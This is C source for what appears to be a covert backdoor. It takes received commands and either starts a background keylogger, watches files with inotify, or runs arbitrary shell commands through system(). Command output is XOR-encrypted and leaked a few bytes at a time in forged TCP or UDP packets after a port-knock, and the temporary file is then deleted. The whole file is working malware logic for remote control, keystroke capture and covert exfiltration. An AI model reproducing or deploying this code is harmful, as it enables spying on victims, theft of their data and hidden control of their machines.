#include <pthread.h>
#include "config.h"
#include "raw_socket.h"

void* Thread_inot(void* cmd) { // "/home/lydia test.txt"
    char str[STR_SIZE];
    memset(str, 0, STR_SIZE);
    strncpy(str, (char *)cmd, strlen((char *)cmd));
    char dir[STR_SIZE];
    memset(dir, 0, STR_SIZE);
    char file[STR_SIZE];
    memset(file, 0, STR_SIZE);
    char* p = strtok(str, " ");

    if(p)
        strncpy(dir, p, strlen(p));

    while(p = strtok(NULL, " ")) {
        strncpy(file, p, strlen(p));
    }
    int run_inotify = inot(dir, file);
    printf("[+]Keep sniffing packets...\n");
    return 0;
}

void* Thread_send(void* file) {
    char buffer[STR_SIZE];
    char long_str[MAX_SIZE];
    memset(long_str,0,MAX_SIZE);
    // Read the file and store to a string
    FILE * fd = fopen((char*)file, "r");
    memset(buffer, 0, STR_SIZE);
    if(fd){
        while(fgets(buffer, STR_SIZE, fd)) {
            strncat(long_str, buffer, MAX_SIZE-strlen(long_str));
            memset(buffer, 0, STR_SIZE);
        }
    } else {
        printf("[-]Failed to open the file\n");
        return 0;
    }
    fclose(fd);
    // TODO delete content from printing.
    printf("\n[+]Start sending file...\n"); 
    fprintf(stderr,"\n%s\n",long_str);

    // Encrypt the string
    char encrypted[MAX_SIZE];
    memset(encrypted, 0, MAX_SIZE);
    encryptDecrypt(encrypted,long_str,XORKEY);

    // Add the return message signal 
    char send_message[MAX_SIZE];
    memset(send_message, 0, MAX_SIZE);
    strncat(send_message, RETURN,MAX_SIZE - strlen(send_message));
    strncat(send_message, encrypted,MAX_SIZE - strlen(send_message));
    strncat(send_message, RESEND,MAX_SIZE - strlen(send_message));
    msleep(1000);
    int ch[4];
    ch[0] = (int)'k';
    for (int i = 0; i < 5; i++) {
        if(strcmp("tcp", PROTOCOL) == 0)
            forgeTCP(ch, "knock");
        else if(strcmp("udp", PROTOCOL) == 0)
            forgeUDP(ch, "knock");
        msleep(800);
    }
    int len = strlen(send_message);
    msleep(1500);
    if(strcmp("tcp", PROTOCOL) == 0) {
        for (int i = 0; i < len; i+=4) {
            ch[0] = send_message[i];
            ch[1] = send_message[i+1];
            ch[2] = send_message[i+2];
            ch[3] = send_message[i+3];
            forgeTCP(ch, "message");
            msleep(800);
        }

    } else if(strcmp("udp", PROTOCOL) == 0) {
        for (int i = 0; i < len; i++) {
            ch[0] = send_message[i];
            forgeUDP(ch, "message");
            msleep(800);
        }
    }
    // Send out the encrypted message
    memset(long_str,0,MAX_SIZE);
    memset(send_message, 0, MAX_SIZE);
    return 0;
}

void delete_file(char* file) {
    char command[STR_SIZE];
    memset(command,0,STR_SIZE);
    strncat(command, "rm ",STR_SIZE - strlen(command));
    strncat(command, file,STR_SIZE - strlen(command));
    system(command);
}

void process_command(char *cmd) {
    char command[STR_SIZE];
    memset(command,0,STR_SIZE);
    pthread_t thread;
    char *ptr;

    if (strcmp(cmd, "keylogger") == 0) {
        char* keylogger = " keylogger.py &";
        strncat(command, PYTHON_VERSION, STR_SIZE - strlen(command));
        strncat(command, keylogger, STR_SIZE - strlen(command));
        system(command);
        printf("\n[+]Running keyologger in the background.\n");
        printf("[+]Keep sniffing packets...\n\n");

    } else if (ptr = strstr((char *)cmd, "inotify ")) {
        ptr += strlen("inotify ");
        char file[STR_SIZE];
        memset(file, 0, STR_SIZE);
        strncpy(file, ptr, strlen(ptr));
       
        printf("\n[+]Start watching file %s\n\n", file);
        if (pthread_create(&thread, NULL, Thread_inot, (void*)file))
            printf("[-]ERROR: Fail to create thread!\n");
        // Join the thread
        pthread_join(thread, NULL);

    } else if (ptr = strstr((char *)cmd, "close")) {
        printf("\n[+]Terminating the program.\n");
        exit(0);
    } else {
        //printf("command:%s\n", cmd);
        char* file = "out.txt";
        strncat(command, cmd, STR_SIZE - strlen(command));
        strncat(command, ">", STR_SIZE - strlen(command));
        strncat(command, file, STR_SIZE - strlen(command));
        system(command);
        // Create a new thread
        if (pthread_create(&thread, NULL, Thread_send, (void*)file))
            printf("[-]ERROR: Fail to create thread!\n");
        // Join the thread
        pthread_join(thread, NULL);
        delete_file(file);
    }       
}

int msleep(long msec) {
    struct timespec ts;
    int res;

    if (msec < 0) {
        errno = EINVAL;
        return -1;
    }

    ts.tv_sec = msec / 1000;
    ts.tv_nsec = (msec % 1000) * 1000000;

    do {
        res = nanosleep(&ts, &ts);
    } while (res && errno == EINTR);

    return res;
}
